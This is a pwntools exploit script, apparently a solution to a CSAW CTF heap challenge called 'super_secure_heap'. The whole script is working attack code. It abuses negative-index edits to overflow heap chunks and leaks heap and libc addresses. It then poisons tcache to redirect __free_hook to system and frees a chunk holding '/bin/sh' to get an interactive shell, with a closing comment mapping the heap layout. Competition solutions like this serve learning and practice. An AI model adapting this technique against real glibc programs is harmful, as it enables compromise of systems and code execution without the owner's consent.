from pwn import *

exe = ELF("./super_secure_heap")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe

p = process("./super_secure_heap")
gdb.attach(p)

# p = remote("pwn.csaw.io", 9998)

p.recvuntil(b">") # first content chunk  - unsorted bin
p.sendline(b"2")
p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b"item:")
p.sendline(b"1033")

for _ in range(4):
    p.recvuntil(b">") # four content chunks of size 32
    p.sendline(b"2")
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b"item:")
    p.sendline(b"16")

for _ in range(9): # 9 key chunks of size 200 - we need all of these to edit content chunk with negative indices
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b">")
    p.sendline(b"1")
    p.recvuntil(b"item:")
    p.sendline(b"200")

p.recvuntil(b">") # sixth content chunk of size 100 - to be overflowed
p.sendline(b"2")
p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b"item:")
p.sendline(b"100")

p.recvuntil(b">") # tenth key chunk of size 200 - to be freed
p.sendline(b"1")
p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b"item:")
p.sendline(b"200")

p.recvuntil(b">") # free last key chunk
p.sendline(b"1")
p.recvuntil(b">") 
p.sendline(b"2")
p.recvuntil(b"remove:")
p.sendline(b"9")

p.recvuntil(b">") # edit sicth content chunk through key function to reach freed key chunk
p.sendline(b"1")
p.recvuntil(b">")
p.sendline(b"3")
p.recvuntil(b"modify:")
p.sendline(b"-11")
p.recvuntil(b"size of the content:")
p.sendline(b"200")
p.recvuntil(b"Enter the content:")
p.sendline(b"A"*0x78)

log.success("good heap address")

p.recvuntil(b">") # read leak
p.sendline(b"2")
p.recvuntil(b">") 
p.sendline(b"4")
p.recvuntil(b"want to show:")
p.sendline(b"5")
p.recvuntil(b"A"*0x78)
leak = p.recvuntil(b"keys or content?")
heap_leak = u64(leak[:6].ljust(8, b"\x00")) + 0x286
log.success(f"{hex(heap_leak)=}")

p.recvuntil(b">") # free for unsorted bin
p.sendline(b"2")
p.recvuntil(b">") 
p.sendline(b"2")
p.recvuntil(b"remove:")
p.sendline(b"0")

p.recvuntil(b">") # read libc leak
p.sendline(b"2")
p.recvuntil(b">") 
p.sendline(b"4")
p.recvuntil(b"want to show:")
p.sendline(b"0")
p.recvuntil(b"Here is your content:")
p.recvline()
leak2 = p.recvuntil(b"keys or content?")
libc_leak = u64(leak2[:6].ljust(8, b"\x00")) + 0x286
free_hook = libc_leak + 0x1fe2
system = libc_leak - 0x19abd6
log.success(f"{hex(free_hook)=}")
log.success(f"{hex(system)=}")

p.recvuntil(b">") # free fifth content chunk
p.sendline(b"2")
p.recvuntil(b">") 
p.sendline(b"2")
p.recvuntil(b"remove:")
p.sendline(b"4")

p.recvuntil(b">") # free fourth content chunk
p.sendline(b"2")
p.recvuntil(b">") 
p.sendline(b"2")
p.recvuntil(b"remove:")
p.sendline(b"3")

p.recvuntil(b">") # free third content chunk
p.sendline(b"2")
p.recvuntil(b">") 
p.sendline(b"2")
p.recvuntil(b"remove:")
p.sendline(b"2")

p.recvuntil(b">") # edit bk to free_hook second content chunk
p.sendline(b"1")
p.recvuntil(b">")
p.sendline(b"3")
p.recvuntil(b"modify:")
p.sendline(b"-14")
p.recvuntil(b"size of the content:")
p.sendline(b"8")
p.recvuntil(b"Enter the content:")
p.sendline(p64(free_hook))

p.recvuntil(b">") # edit bk to free_hook third content chunk
p.sendline(b"1")
p.recvuntil(b">")
p.sendline(b"3")
p.recvuntil(b"modify:")
p.sendline(b"-13")
p.recvuntil(b"size of the content:")
p.sendline(b"8")
p.recvuntil(b"Enter the content:")
p.sendline(b"/bin/sh\x00")

p.recvuntil(b">") # realloc third content chunk
p.sendline(b"2")
p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b"item:")
p.sendline(b"16")

p.recvuntil(b">") # realloc fourth content chunk
p.sendline(b"2")
p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b"item:")
p.sendline(b"16")

p.recvuntil(b">") # edit bk to free_hook third content chunk
p.sendline(b"1")
p.recvuntil(b">")
p.sendline(b"3")
p.recvuntil(b"modify:")
p.sendline(b"-9")
p.recvuntil(b"size of the content:")
p.sendline(b"8")
p.recvuntil(b"Enter the content:")
p.sendline(p64(system))

p.recvuntil(b">") # free content chunk with bin/sh in it! -> system("/bin/sh")
p.sendline(b"2")
p.recvuntil(b">") 
p.sendline(b"2")
p.recvuntil(b"remove:")
p.sendline(b"3")

p.interactive()


"""
heap layout here:
content chunk - 0x409 - freed - unsorted bin
content chunk - 0x20 - buffer from unsorted bin
content chunk - 0x20 - free, then edit to p64(free_hook) - then realloc
content chunk - 0x20 - free, then edit to /bin/sh\0 - then realloc
content chunk - 0x20 - free
key chunk - 0xd1
key chunk - 0xd1
key chunk - 0xd1
key chunk - 0xd1
key chunk - 0xd1
key chunk - 0xd1
key chunk - 0xd1
key chunk - 0xd1
key chunk - 0xd1
content chunk - 0x64 - overflowed into next
key chunk - 0x4141414141414141 - freed tcache bin
"""